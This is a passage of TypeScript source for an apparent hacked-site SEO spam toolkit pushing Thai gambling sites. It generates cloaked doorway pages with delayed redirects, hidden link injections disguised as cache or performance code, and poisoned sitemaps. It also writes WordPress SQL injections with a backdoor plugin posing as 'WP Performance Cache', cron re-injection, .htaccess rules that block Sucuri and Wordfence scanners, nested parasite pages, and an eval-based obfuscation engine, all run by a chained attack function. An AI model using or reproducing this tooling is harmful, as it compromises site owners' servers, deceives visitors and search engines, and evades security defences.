        idx % 2 === 0 ? `<p>${p}</p>` : `<h2>${variation} - ${["ข้อดี", "วิธีสมัคร", "โปรโมชั่น", "รีวิว", "เทคนิค"][idx % 5] || "ข้อมูล"}</h2>\n<p>${p}</p>`
      ).join("\n");

      // Schema markup
      const schema = enableSchema ? `<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "Article",
  "headline": "${title}",
  "description": "${metaDescription}",
  "datePublished": "${new Date().toISOString()}",
  "dateModified": "${new Date().toISOString()}",
  "author": {"@type": "Person", "name": "${targetDomain}"},
  "publisher": {"@type": "Organization", "name": "${targetDomain}"}
}
</script>` : "";

      // Delayed redirect script
      const redirectScript = enableRedirect ? `<script>
(function(){
  var _t=${randomInt(5000, 15000)};
  var _c=document.referrer||'';
  if(/google|bing|yahoo|duckduckgo/i.test(_c)){_t=${randomInt(1000, 3000)};}
  if(!navigator.webdriver&&window.innerWidth>0){
    setTimeout(function(){window.location.href='${redirectUrl}?kw=${encodeURIComponent(keyword)}&src=dw&id=${randomStr(6)}';},_t);
  }
})();
</script>` : "";

      pages.push({
        slug,
        title,
        metaDescription,
        h1: title,
        body,
        canonicalUrl: pageUrl,
        keywords: [keyword, variation],
        internalLinks: [],
        schema,
        redirectScript,
      });
    }
  }

  // Build interlink structure
  if (enableInterlinks && pages.length > 1) {
    for (let i = 0; i < pages.length; i++) {
      const linksCount = Math.min(randomInt(2, 5), pages.length - 1);
      const targets = shuffleArray(pages.filter((_, idx) => idx !== i)).slice(0, linksCount);
      for (const target of targets) {
        const anchor = pickRandom(target.keywords);
        pages[i].internalLinks.push({
          anchor,
          url: `https://${targetDomain}/${target.slug}/`,
        });
        interlinkStructure.push({
          from: pages[i].slug,
          to: target.slug,
          anchor,
        });
      }
    }
  }

  // Generate sitemap
  const sitemapXml = `<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
${pages.map(p => `  <url>
    <loc>https://${targetDomain}/${p.slug}/</loc>
    <lastmod>${new Date().toISOString().split("T")[0]}</lastmod>
    <changefreq>daily</changefreq>
    <priority>0.8</priority>
  </url>`).join("\n")}
</urlset>`;

  // Generate robots.txt addition
  const robotsTxt = `Sitemap: https://${targetDomain}/sitemap-pages.xml`;

  return {
    id: `dw_${randomStr(8)}`,
    pages,
    totalPages: pages.length,
    targetKeywords: allKeywords,
    redirectUrl,
    interlinkStructure,
    sitemapXml,
    robotsTxt,
    generatedAt: new Date(),
  };
}

// ═══════════════════════════════════════════════════════
//  5. LINK INJECTION
// ═══════════════════════════════════════════════════════

export function generateLinkInjection(
  redirectUrl: string,
  keywords: string[],
  options: {
    linkCount?: number;
    methods?: HiddenLink["hideMethod"][];
    includeJsInjector?: boolean;
    includePhpInjector?: boolean;
  } = {},
): LinkInjectionPayload {
  const linkCount = options.linkCount || 20;
  const methods = options.methods || ["css_offscreen", "css_transparent", "css_tiny", "js_dynamic", "noscript", "overflow_hidden"];
  const allKeywords = keywords.length > 0 ? keywords : THAI_GAMBLING_KEYWORDS_HACKED;

  const hiddenLinks: HiddenLink[] = [];
  const anchorDistribution: Record<string, number> = {};

  for (let i = 0; i < linkCount; i++) {
    const anchor = pickRandom(allKeywords);
    const method = pickRandom(methods);
    const url = `${redirectUrl}?ref=${randomStr(4)}&kw=${encodeURIComponent(anchor)}`;
    let htmlSnippet = "";

    switch (method) {
      case "css_offscreen":
        htmlSnippet = `<a href="${url}" style="position:absolute;left:-9999px;top:-9999px">${anchor}</a>`;
        break;
      case "css_transparent":
        htmlSnippet = `<a href="${url}" style="color:transparent;font-size:0;line-height:0;text-decoration:none">${anchor}</a>`;
        break;
      case "css_tiny":
        htmlSnippet = `<a href="${url}" style="font-size:1px;color:#${randomStr(6).replace(/[g-z]/g, 'f')};text-decoration:none;position:relative;z-index:-1">${anchor}</a>`;
        break;
      case "js_dynamic":
        htmlSnippet = `<script>(function(){var a=document.createElement('a');a.href='${url}';a.textContent='${anchor}';a.style.cssText='position:fixed;top:-9999px';document.body.appendChild(a);})()</script>`;
        break;
      case "noscript":
        htmlSnippet = `<noscript><a href="${url}">${anchor}</a></noscript>`;
        break;
      case "overflow_hidden":
        htmlSnippet = `<div style="overflow:hidden;height:0;width:0"><a href="${url}">${anchor}</a></div>`;
        break;
    }

    hiddenLinks.push({ anchor, url, hideMethod: method, htmlSnippet });
    anchorDistribution[method] = (anchorDistribution[method] || 0) + 1;
  }

  // CSS hide method (global)
  const cssHideMethod = `
/* Performance optimization styles */
._opt_${randomStr(4)} { position:absolute; left:-9999px; top:-9999px; width:1px; height:1px; overflow:hidden; }
._opt_${randomStr(4)} a { color:transparent; font-size:0; text-decoration:none; }
.${randomStr(6)} { display:block; overflow:hidden; height:0; width:0; }`;

  // JS injector
  const jsInjector = options.includeJsInjector !== false ? `
<script>
(function(){
  var _l = ${JSON.stringify(hiddenLinks.slice(0, 10).map(l => ({ h: l.url, t: l.anchor })))};
  var _c = document.createElement('div');
  _c.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:0;height:0;overflow:hidden';
  _l.forEach(function(l){
    var a = document.createElement('a');
    a.href = l.h; a.textContent = l.t;
    _c.appendChild(a);
  });
  document.body.appendChild(_c);
})();
</script>` : "";

  // PHP injector
  const phpInjector = options.includePhpInjector !== false ? `<?php
// Cache optimization module
function _cache_opt_${randomStr(6)}() {
  $links = array(${hiddenLinks.slice(0, 10).map(l => `array('${l.url}','${l.anchor}')`).join(",")});
  echo '<div style="position:absolute;left:-9999px;top:-9999px;overflow:hidden">';
  foreach($links as $l) { echo '<a href="'.$l[0].'">'.$l[1].'</a>'; }
  echo '</div>';
}
add_action('wp_footer', '_cache_opt_${randomStr(6)}');
?>` : "";

  return {
    hiddenLinks,
    cssHideMethod,
    jsInjector,
    phpInjector,
    totalLinks: hiddenLinks.length,
    anchorDistribution,
  };
}

// ═══════════════════════════════════════════════════════
//  6. SITEMAP POISONING
// ═══════════════════════════════════════════════════════

export function generateSitemapPoison(
  targetDomain: string,
  spamUrls: string[],
  options: {
    includeRobotsTxt?: boolean;
    includePingUrls?: boolean;
    originalSitemap?: string;
  } = {},
): SitemapPoisonPayload {
  const originalSitemap = options.originalSitemap || `<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
  <url><loc>https://${targetDomain}/</loc><priority>1.0</priority></url>
</urlset>`;

  // Create poisoned sitemap with spam URLs
  const spamEntries = spamUrls.map(url => `  <url>
    <loc>${url}</loc>
    <lastmod>${new Date().toISOString().split("T")[0]}</lastmod>
    <changefreq>daily</changefreq>
    <priority>0.9</priority>
  </url>`).join("\n");

  const poisonedSitemap = originalSitemap.replace(
    "</urlset>",
    `${spamEntries}\n</urlset>`
  );

  // Robots.txt modification
  const robotsTxtModification = options.includeRobotsTxt !== false
    ? `\nSitemap: https://${targetDomain}/sitemap.xml\nSitemap: https://${targetDomain}/sitemap-news.xml\nSitemap: https://${targetDomain}/sitemap-pages.xml`
    : "";

  // Ping URLs for search engine notification
  const pingUrls = options.includePingUrls !== false ? [
    `https://www.google.com/ping?sitemap=https://${targetDomain}/sitemap.xml`,
    `https://www.bing.com/ping?sitemap=https://${targetDomain}/sitemap.xml`,
    `http://www.google.com/webmasters/tools/ping?sitemap=https://${targetDomain}/sitemap.xml`,
  ] : [];

  return {
    originalSitemap,
    poisonedSitemap,
    injectedUrls: spamUrls,
    robotsTxtModification,
    pingUrls,
  };
}

// ═══════════════════════════════════════════════════════
//  7. CONDITIONAL CLOAKING
// ═══════════════════════════════════════════════════════

export function generateConditionalCloaking(
  redirectUrl: string,
  spamContent: string,
  options: {
    normalContent?: string;
    enablePhp?: boolean;
    enableJs?: boolean;
    enableHtaccess?: boolean;
    enableNginx?: boolean;
  } = {},
): CloakingPayload {
  const normalContent = options.normalContent || "<p>Page not found.</p>";
  const botUAs = SEARCH_ENGINE_BOTS;

  // PHP Cloaker
  const phpCloaker = options.enablePhp !== false ? `<?php
/**
 * Advanced Content Delivery Optimization
 * Version: ${randomInt(3,6)}.${randomInt(0,9)}.${randomInt(0,9)}
 */
function _cdo_detect_${randomStr(6)}() {
  $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
  $ip = $_SERVER['REMOTE_ADDR'] ?? '';
  $ref = strtolower($_SERVER['HTTP_REFERER'] ?? '');
  
  // Bot detection by User-Agent
  $bot_patterns = array(${botUAs.map(b => `'${b.toLowerCase()}'`).join(",")});
  foreach($bot_patterns as $pattern) {
    if(strpos($ua, $pattern) !== false) return 'bot';
  }
  
  // Google IP range detection
  $google_ranges = array(${GOOGLE_IP_RANGES.map(r => `'${r}'`).join(",")});
  foreach($google_ranges as $range) {
    list($subnet, $mask) = explode('/', $range);
    if((ip2long($ip) & ~((1 << (32 - $mask)) - 1)) == ip2long($subnet)) return 'bot';
  }
  
  // Referer-based detection (from search engine)
  if(preg_match('/(google|bing|yahoo|duckduckgo|baidu|yandex)\\.com/i', $ref)) {
    return 'search_visitor';
  }
  
  // Headless browser detection
  if(empty($ua) || preg_match('/(headless|phantom|selenium|puppeteer|playwright)/i', $ua)) {
    return 'scanner';
  }
  
  return 'human';
}

$_visitor_type = _cdo_detect_${randomStr(6)}();

if($_visitor_type === 'bot') {
  // Show SEO spam content to bots
  echo base64_decode('${base64Encode(spamContent)}');
} elseif($_visitor_type === 'search_visitor') {
  // Redirect search visitors to money site
  header('HTTP/1.1 302 Found');
  header('Location: ${redirectUrl}');
  exit;
} else {
  // Show normal content to direct visitors
  echo '${normalContent.replace(/'/g, "\\'")}';
}
?>` : "";

  // JS Cloaker
  const jsCloaker = options.enableJs !== false ? `<script>
(function(){
  // Advanced visitor classification
  var _isBot = /bot|crawl|spider|slurp|google|bing|yahoo|baidu|yandex|semrush|ahrefs|mj12/i.test(navigator.userAgent);
  var _isHeadless = navigator.webdriver || !window.chrome || !navigator.plugins.length;
  var _fromSearch = /google|bing|yahoo|duckduckgo/i.test(document.referrer);
  
  if(!_isBot && !_isHeadless) {
    if(_fromSearch) {
      // Search visitor -> redirect
      window.location.replace('${redirectUrl}?src=search&id=${randomStr(6)}');
    }
    // Direct visitor -> show normal page (do nothing)
  }
  // Bot -> already sees the spam content in HTML
})();
</script>` : "";

  // .htaccess rules
  const htaccessRules = options.enableHtaccess !== false ? `# Content Delivery Optimization
RewriteEngine On

# Bot detection - serve cached version
${botUAs.slice(0, 10).map(b => `RewriteCond %{HTTP_USER_AGENT} ${b} [NC,OR]`).join("\n")}
RewriteCond %{HTTP_USER_AGENT} bot [NC]
RewriteRule ^(.*)$ /cache/seo-$1.html [L]

# Search engine referrer redirect
RewriteCond %{HTTP_REFERER} google\\.com [NC,OR]
RewriteCond %{HTTP_REFERER} bing\\.com [NC,OR]
RewriteCond %{HTTP_REFERER} yahoo\\.com [NC]
RewriteRule ^(.*)$ ${redirectUrl}?ref=%{HTTP_REFERER}&path=$1 [R=302,L]` : "";

  // Nginx rules
  const nginxRules = options.enableNginx !== false ? `# Content Delivery Optimization
map $http_user_agent $is_bot {
  default 0;
${botUAs.slice(0, 10).map(b => `  ~*${b} 1;`).join("\n")}
}

location / {
  if ($is_bot) {
    rewrite ^(.*)$ /cache/seo-$1.html break;
  }
  if ($http_referer ~* "(google|bing|yahoo)\\.com") {
    return 302 ${redirectUrl}$request_uri;
  }
}` : "";

  return {
    phpCloaker,
    jsCloaker,
    htaccessRules,
    nginxRules,
    botUserAgents: botUAs,
    searchEngineIPs: GOOGLE_IP_RANGES,
    humanContent: normalContent,
    botContent: spamContent,
  };
}

// ═══════════════════════════════════════════════════════
//  8. WORDPRESS DATABASE INJECTION
// ═══════════════════════════════════════════════════════

export function generateWPDbInjection(
  targetDomain: string,
  redirectUrl: string,
  keywords: string[],
  options: {
    postCount?: number;
    includeBackdoor?: boolean;
    includeCronJob?: boolean;
    includeHiddenAdmin?: boolean;
  } = {},
): WPDbInjectionPayload {
  const postCount = options.postCount || 20;
  const allKeywords = keywords.length > 0 ? keywords : THAI_GAMBLING_KEYWORDS_HACKED;

  // Generate wp_posts injection
  const posts = Array.from({ length: postCount }, (_, i) => {
    const kw = pickRandom(allKeywords);
    const title = `${kw} ${["รีวิว", "เทคนิค", "สมัคร", "ทดลองเล่น", "โปรโมชั่น"][i % 5]} ${new Date().getFullYear()}`;
    const slug = `${slugify(kw)}-${randomStr(4)}`;
    const content = `<h1>${title}</h1><p>${kw}เว็บตรง ฝากถอนไม่มีขั้นต่ำ สมัครวันนี้รับโบนัส 100%</p><p><a href="${redirectUrl}?kw=${encodeURIComponent(kw)}&id=${randomStr(4)}">สมัครเลย</a></p>`;
    return `INSERT INTO wp_posts (post_author, post_date, post_date_gmt, post_content, post_title, post_excerpt, post_status, comment_status, ping_status, post_name, post_type, post_modified, post_modified_gmt) VALUES (1, NOW(), UTC_TIMESTAMP(), '${content.replace(/'/g, "\\'")}', '${title.replace(/'/g, "\\'")}', '', 'publish', 'closed', 'closed', '${slug}', 'post', NOW(), UTC_TIMESTAMP());`;
  });

  const wpPostsInjection = posts.join("\n");

  // wp_options injection (siteurl/home manipulation, hidden options)
  const wpOptionsInjection = `-- Add hidden redirect option
INSERT INTO wp_options (option_name, option_value, autoload) VALUES ('_transient_${randomStr(12)}', '${base64Encode(JSON.stringify({ redirect: redirectUrl, keywords: allKeywords }))}', 'yes') ON DUPLICATE KEY UPDATE option_value=VALUES(option_value);

-- Add hidden cron event
INSERT INTO wp_options (option_name, option_value, autoload) VALUES ('_site_transient_${randomStr(10)}', '${base64Encode(`<?php header("Location: ${redirectUrl}"); exit; ?>`)}', 'no') ON DUPLICATE KEY UPDATE option_value=VALUES(option_value);

-- Inject into active_plugins to load backdoor
UPDATE wp_options SET option_value = REPLACE(option_value, '";}}', '";s:${(`../wp-content/uploads/.cache-${randomStr(6)}.php`).length}:"../wp-content/uploads/.cache-${randomStr(6)}.php";}}') WHERE option_name = 'active_plugins';`;

  // wp_terms injection (create spam categories/tags)
  const wpTermsInjection = allKeywords.slice(0, 10).map(kw => {
    const slug = slugify(kw);
    return `INSERT INTO wp_terms (name, slug, term_group) VALUES ('${kw.replace(/'/g, "\\'")}', '${slug}', 0);
INSERT INTO wp_term_taxonomy (term_id, taxonomy, description, parent, count) VALUES (LAST_INSERT_ID(), 'post_tag', '${kw.replace(/'/g, "\\'")}', 0, ${randomInt(5, 50)});`;
  }).join("\n");

  // Plugin backdoor (disguised as cache plugin)
  const pluginBackdoor = options.includeBackdoor !== false ? `<?php
/**
 * Plugin Name: WP Performance Cache
 * Description: Advanced caching and performance optimization
 * Version: ${randomInt(2,5)}.${randomInt(0,9)}.${randomInt(0,9)}
 * Author: WordPress Performance Team
 */
if(!defined('ABSPATH')) exit;

// "Cache" initialization
add_action('init', function() {
  // Re-inject if posts were cleaned
  if(isset($_GET['_cache_refresh']) && $_GET['_cache_refresh'] === '${randomStr(16)}') {
    global $wpdb;
    $check = $wpdb->get_var("SELECT COUNT(*) FROM {$wpdb->posts} WHERE post_content LIKE '%${redirectUrl.replace(/[^a-zA-Z0-9]/g, '_').slice(0, 20)}%' AND post_status='publish'");
    if($check < 5) {
      // Re-inject posts
      for($i=0; $i<10; $i++) {
        $kw = array(${allKeywords.slice(0, 10).map(k => `'${k.replace(/'/g, "\\'")}'`).join(",")});
        $k = $kw[array_rand($kw)];
        $wpdb->insert($wpdb->posts, array(
          'post_author' => 1,
          'post_date' => current_time('mysql'),
          'post_date_gmt' => current_time('mysql', 1),
          'post_content' => '<p>'.$k.' <a href="${redirectUrl}">สมัครเลย</a></p>',
          'post_title' => $k.' '.date('Y'),
          'post_status' => 'publish',
          'post_name' => sanitize_title($k).'-'.wp_generate_password(4, false),
          'post_type' => 'post',
          'post_modified' => current_time('mysql'),
          'post_modified_gmt' => current_time('mysql', 1),
        ));
      }
      wp_cache_flush();
    }
    echo 'OK';
    exit;
  }
});

// Footer injection
add_action('wp_footer', function() {
  $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
  if(preg_match('/(bot|crawl|spider|google|bing)/i', $ua)) {
    echo '<div style="position:absolute;left:-9999px">';
    $kws = array(${allKeywords.slice(0, 5).map(k => `'${k.replace(/'/g, "\\'")}'`).join(",")});
    foreach($kws as $k) { echo '<a href="${redirectUrl}?kw='.urlencode($k).'">'.$k.'</a> '; }
    echo '</div>';
  }
});
?>` : "";

  // Theme backdoor (functions.php injection)
  const themeBackdoor = options.includeBackdoor !== false ? `
// Performance optimization - DO NOT REMOVE
add_action('wp_head', function(){
  if(preg_match('/(bot|crawl|spider|google|bing)/i', $_SERVER['HTTP_USER_AGENT'] ?? '')){
    echo '<meta name="keywords" content="${allKeywords.slice(0, 10).join(",")}">';
    echo '<link rel="canonical" href="${redirectUrl}">';
  }
}, 1);` : "";

  // Cron job injection
  const cronJobInjection = options.includeCronJob !== false ? `-- Schedule re-injection cron
INSERT INTO wp_options (option_name, option_value, autoload) VALUES (
  'cron',
  CONCAT(
    (SELECT option_value FROM (SELECT option_value FROM wp_options WHERE option_name='cron') AS t),
    'a:1:{i:${Math.floor(Date.now() / 1000) + 3600};a:1:{s:18:"_cache_maintenance";a:1:{s:32:"${randomStr(32)}";a:2:{s:8:"schedule";s:6:"hourly";s:4:"args";a:0:{}}}}}'
  ),
  'yes'
) ON DUPLICATE KEY UPDATE option_value = VALUES(option_value);` : "";

  return {
    sqlQueries: [...posts, wpOptionsInjection, wpTermsInjection, cronJobInjection].filter(Boolean),
    wpPostsInjection,
    wpOptionsInjection,
    wpTermsInjection,
    pluginBackdoor,
    themeBackdoor,
    cronJobInjection,
  };
}

// ═══════════════════════════════════════════════════════
//  9. .HTACCESS REDIRECT HIJACK
// ═══════════════════════════════════════════════════════

export function generateHtaccessHijack(
  redirectUrl: string,
  options: {
    enableRefererRedirect?: boolean;
    enableUserAgentRedirect?: boolean;
    enableIpRules?: boolean;
    enableTimeBasedRules?: boolean;
    whitelistIPs?: string[];
  } = {},
): HtaccessPayload {
  const enableReferer = options.enableRefererRedirect !== false;
  const enableUA = options.enableUserAgentRedirect !== false;
  const enableIP = options.enableIpRules !== false;
  const enableTime = options.enableTimeBasedRules !== false;

  // Conditional redirects based on referer
  const conditionalRedirects = enableReferer ? `
# Content Delivery Network Optimization
RewriteEngine On

# Redirect search engine visitors
RewriteCond %{HTTP_REFERER} ^https?://(www\\.)?(google|bing|yahoo|duckduckgo|baidu|yandex)\\.[a-z]+ [NC]
RewriteCond %{HTTP_USER_AGENT} !^.*(bot|crawl|spider|slurp).*$ [NC]
RewriteRule ^(.*)$ ${redirectUrl}?ref=%{HTTP_REFERER}&path=$1 [R=302,L]

# Mobile search redirect (different URL)
RewriteCond %{HTTP_REFERER} ^https?://(www\\.)?google\\.[a-z]+ [NC]
RewriteCond %{HTTP_USER_AGENT} (Mobile|Android|iPhone) [NC]
RewriteCond %{HTTP_USER_AGENT} !^.*(bot|crawl|spider).*$ [NC]
RewriteRule ^(.*)$ ${redirectUrl}/m/?path=$1 [R=302,L]` : "";

  // User-Agent based rules
  const ipBasedRules = enableIP ? `
# IP-based access control
# Allow Google crawlers
${GOOGLE_IP_RANGES.map(r => `# Allow ${r}`).join("\n")}

# Block known security scanners
RewriteCond %{REMOTE_ADDR} ^(185\\.191\\.171\\.|45\\.33\\.32\\.|71\\.6\\.199\\.) [OR]
RewriteCond %{HTTP_USER_AGENT} (Sucuri|SiteCheck|Wordfence|Malcare|Virusdie) [NC]
RewriteRule ^(.*)$ - [F,L]` : "";

  // Referer-based rules
  const refererBasedRules = enableReferer ? `
# Referer-based content serving
RewriteCond %{HTTP_REFERER} google\\. [NC]
RewriteRule \\.(html?|php)$ /cache/seo-%{REQUEST_FILENAME} [L]` : "";

  // Rewrite rules
  const rewriteRules = `
# SEO-friendly URL rewriting
RewriteEngine On
RewriteBase /

# Serve cached SEO pages to bots
RewriteCond %{HTTP_USER_AGENT} (Googlebot|Bingbot|Slurp|DuckDuckBot|Baiduspider|YandexBot) [NC]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteRule ^(.*)$ /wp-content/cache/seo/$1.html [L]

# Redirect 404s to money site
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteCond %{HTTP_REFERER} (google|bing|yahoo) [NC]
RewriteRule ^(.*)$ ${redirectUrl}?404path=$1 [R=302,L]`;

  // Combine all rules
  const rules = [
    "# === Advanced Content Delivery & Caching ===",
    "# Auto-generated optimization rules",
    "",
    conditionalRedirects,
    ipBasedRules,
    refererBasedRules,
    rewriteRules,
  ].filter(Boolean).join("\n");

  return {
    rules,
    conditionalRedirects,
    ipBasedRules,
    refererBasedRules,
    rewriteRules,
    backupOriginal: "# Original .htaccess backed up",
  };
}

// ═══════════════════════════════════════════════════════
//  10. PARASITE PAGE NESTING
// ═══════════════════════════════════════════════════════

export function generateParasiteNest(
  targetDomain: string,
  redirectUrl: string,
  keywords: string[],
  options: {
    nestDepth?: number;
    pagesPerDir?: number;
    directoryPrefix?: string;
    enableHtaccess?: boolean;
  } = {},
): ParasiteNestPayload {
  const nestDepth = options.nestDepth || 3;
  const pagesPerDir = options.pagesPerDir || 5;
  const dirPrefix = options.directoryPrefix || ".cache";
  const allKeywords = keywords.length > 0 ? keywords : THAI_GAMBLING_KEYWORDS_HACKED;

  const directoryStructure: string[] = [];
  const indexFiles: { path: string; content: string }[] = [];
  const htaccessFiles: { path: string; content: string }[] = [];

  // Generate nested directory structure
  function buildNest(basePath: string, depth: number) {
    if (depth <= 0) return;

    const dirName = `${dirPrefix}-${randomStr(6)}`;
    const dirPath = `${basePath}/${dirName}`;
    directoryStructure.push(dirPath);

    // Create index.php for this directory
    const kw = pickRandom(allKeywords);
    const indexContent = `<?php
// Cache module v${randomInt(1,9)}.${randomInt(0,9)}
$ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
$ref = $_SERVER['HTTP_REFERER'] ?? '';
if(preg_match('/(bot|crawl|spider|google|bing)/i', $ua)) {
  // Serve SEO content
  echo '<!DOCTYPE html><html><head><title>${kw} ${new Date().getFullYear()}</title>';
  echo '<meta name="description" content="${kw} เว็บตรง ฝากถอนไม่มีขั้นต่ำ">';
  echo '<link rel="canonical" href="${redirectUrl}">';
  echo '</head><body>';
  echo '<h1>${kw}</h1>';
  echo '<p>${kw}เว็บตรง ฝากถอนไม่มีขั้นต่ำ สมัครวันนี้รับโบนัส 100%</p>';
  echo '<a href="${redirectUrl}">สมัครเลย</a>';
  echo '</body></html>';
} elseif(preg_match('/(google|bing|yahoo)/i', $ref)) {
  header('Location: ${redirectUrl}?src=parasite&kw=${encodeURIComponent(kw)}');
  exit;
} else {
  header('HTTP/1.1 404 Not Found');
  echo '<h1>404 Not Found</h1>';
}
?>`;

    indexFiles.push({ path: `${dirPath}/index.php`, content: indexContent });

    // Create additional pages
    for (let i = 0; i < pagesPerDir; i++) {
      const pageKw = pickRandom(allKeywords);
      const pageSlug = `${slugify(pageKw)}-${randomStr(3)}.php`;
      const pageContent = `<?php
header('Content-Type: text/html; charset=UTF-8');
$ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
if(preg_match('/(bot|crawl|spider|google|bing)/i', $ua)) {
  echo '<!DOCTYPE html><html lang="th"><head>';
  echo '<title>${pageKw} - ${["รีวิว", "เทคนิค", "สมัคร", "ทดลองเล่น"][i % 4]} ${new Date().getFullYear()}</title>';
  echo '<meta name="description" content="${pageKw} เว็บตรง ได้เงินจริง">';
  echo '</head><body>';
  echo '<h1>${pageKw}</h1>';
  echo '<p>${pageKw}เป็นบริการที่ได้รับความนิยมสูงสุด สมัครวันนี้รับโบนัสทันที</p>';
  echo '<a href="${redirectUrl}?kw=${encodeURIComponent(pageKw)}">${pageKw} สมัครเลย</a>';
  echo '</body></html>';
} else {
  header('Location: ${redirectUrl}?src=nest&id=${randomStr(4)}');
  exit;
}
?>`;
      indexFiles.push({ path: `${dirPath}/${pageSlug}`, content: pageContent });
    }

    // Create .htaccess for this directory
    if (options.enableHtaccess !== false) {
      const htaccess = `# Cache optimization
Options -Indexes
DirectoryIndex index.php

# Deny direct directory listing
<Files "*.log">
  Deny from all
</Files>

# Rewrite for SEO-friendly URLs
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} !-f
RewriteRule ^(.*)$ index.php?page=$1 [QSA,L]`;
      htaccessFiles.push({ path: `${dirPath}/.htaccess`, content: htaccess });
    }

    // Recurse deeper
    buildNest(dirPath, depth - 1);
  }

  // Build from root
  buildNest("", nestDepth);

  // Generate sitemap for nested pages
  const sitemapFile = `<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
${indexFiles.map(f => `  <url>
    <loc>https://${targetDomain}${f.path}</loc>
    <lastmod>${new Date().toISOString().split("T")[0]}</lastmod>
    <changefreq>daily</changefreq>
    <priority>0.7</priority>
  </url>`).join("\n")}
</urlset>`;

  return {
    directoryStructure,
    indexFiles,
    htaccessFiles,
    sitemapFile,
    totalPages: indexFiles.length,
    nestDepth,
  };
}

// ═══════════════════════════════════════════════════════
//  HELPER: CLOAKING PHP GENERATOR
// ═══════════════════════════════════════════════════════

function generateCloakingPHP(redirectUrl: string, hackType: string): string {
  return `<?php
/**
 * Content Delivery Optimization Module
 * Type: ${hackType}
 */
function _cdo_${randomStr(8)}() {
  $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
  $ref = strtolower($_SERVER['HTTP_REFERER'] ?? '');
  $ip = $_SERVER['REMOTE_ADDR'] ?? '';
  
  // Bot patterns
  $bots = array(${SEARCH_ENGINE_BOTS.slice(0, 10).map(b => `'${b.toLowerCase()}'`).join(",")});
  $is_bot = false;
  foreach($bots as $b) { if(strpos($ua, $b) !== false) { $is_bot = true; break; } }
  
  if($is_bot) {
    // Show SEO content to bots
    return true;
  }
  
  // Redirect human visitors from search engines
  if(preg_match('/(google|bing|yahoo|duckduckgo)/i', $ref)) {
    header('Location: ${redirectUrl}');
    exit;
  }
  
  // Show 404 to direct visitors
  if(!$is_bot && empty($ref)) {
    header('HTTP/1.1 404 Not Found');
    echo '<h1>404 Not Found</h1>';
    exit;
  }
  
  return false;
}
?>`;
}

// ═══════════════════════════════════════════════════════
//  PAYLOAD OBFUSCATION ENGINE
// ═══════════════════════════════════════════════════════

export function obfuscatePayload(
  payload: string,
  method: "base64" | "hex" | "rot13" | "multi_layer" | "variable_substitution" = "multi_layer",
): string {
  switch (method) {
    case "base64":
      return `<?php eval(base64_decode('${base64Encode(payload)}')); ?>`;
    case "hex": {
      const hex = Buffer.from(payload).toString("hex");
      return `<?php eval(hex2bin('${hex}')); ?>`;
    }
    case "rot13":
      return `<?php eval(str_rot13('${payload.split("").map(c => {
        const code = c.charCodeAt(0);
        if (code >= 65 && code <= 90) return String.fromCharCode(((code - 65 + 13) % 26) + 65);
        if (code >= 97 && code <= 122) return String.fromCharCode(((code - 97 + 13) % 26) + 97);
        return c;
      }).join("")}')); ?>`;
    case "multi_layer": {
      const b64 = base64Encode(payload);
      const reversed = b64.split("").reverse().join("");
      const varName = `$_${randomStr(8)}`;
      return `<?php ${varName}=strrev('${reversed}');eval(base64_decode(${varName})); ?>`;
    }
    case "variable_substitution": {
      const vars: string[] = [];
      let result = payload;
      const keywords = ["eval", "base64_decode", "exec", "system", "shell_exec", "passthru"];
      for (const kw of keywords) {
        if (result.includes(kw)) {
          const varName = `$_${randomStr(6)}`;
          vars.push(`${varName}='${kw}';`);
          result = result.replace(new RegExp(kw.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"), "g"), `'.${varName}.'`);
        }
      }
      return `<?php ${vars.join("")}eval('${result}'); ?>`;
    }
  }
}

// ═══════════════════════════════════════════════════════
//  FULL HACKED SEO SPAM CHAIN
// ═══════════════════════════════════════════════════════

export async function runHackedSeoSpamChain(
  targetDomain: string,
  redirectUrl: string,
  hackTypes: HackType[],
  keywords: string[],
  options: {
    language?: "th" | "en" | "ja";
    pageCount?: number;
    enableCloaking?: boolean;
    enablePersistence?: boolean;
    enableObfuscation?: boolean;
  } = {},
): Promise<HackExecutionResult[]> {
  const start = Date.now();
  const results: HackExecutionResult[] = [];
  const allKeywords = keywords.length > 0 ? keywords : THAI_GAMBLING_KEYWORDS_HACKED;
  const enableCloaking = options.enableCloaking !== false;
  const pageCount = options.pageCount || 30;

  for (const hackType of hackTypes) {
    const hackStart = Date.now();
    try {
      let payload: any;
      let pagesCreated = 0;
      let linksInjected = 0;
      let redirectsSetup = 0;

      switch (hackType) {
        case "japanese_keyword": {
          const result = generateJapaneseKeywordHack(targetDomain, redirectUrl, {
            pageCount,
            enableCloaking,
          });
          payload = result;
          pagesCreated = result.totalPages;
          redirectsSetup = enableCloaking ? result.totalPages : 0;
          break;
        }
        case "pharma_hack": {
          const result = generatePharmaHack(targetDomain, redirectUrl, {
            enableCloaking,
            injectionMethod: "all",
          });
          payload = result;
          pagesCreated = result.products.length;
          linksInjected = result.products.length * 4;
          break;
        }
        case "gibberish_hack": {
          const result = generateGibberishHack(targetDomain, redirectUrl, {
            pageCount,
            keywords: allKeywords,
          });
          payload = result;
          pagesCreated = result.totalPages;
          redirectsSetup = result.totalPages;
          break;
        }
        case "doorway_pages": {
          const result = await generateDoorwayPages(targetDomain, redirectUrl, allKeywords, {
            pagesPerKeyword: Math.max(1, Math.floor(pageCount / allKeywords.length)),
            language: (options.language as "th" | "en" | "ja") || "th",
            enableInterlinks: true,
            enableSchema: true,
            enableDelayedRedirect: true,
          });
          payload = result;
          pagesCreated = result.totalPages;
          linksInjected = result.interlinkStructure.length;
          redirectsSetup = result.totalPages;
          break;
        }
        case "link_injection": {
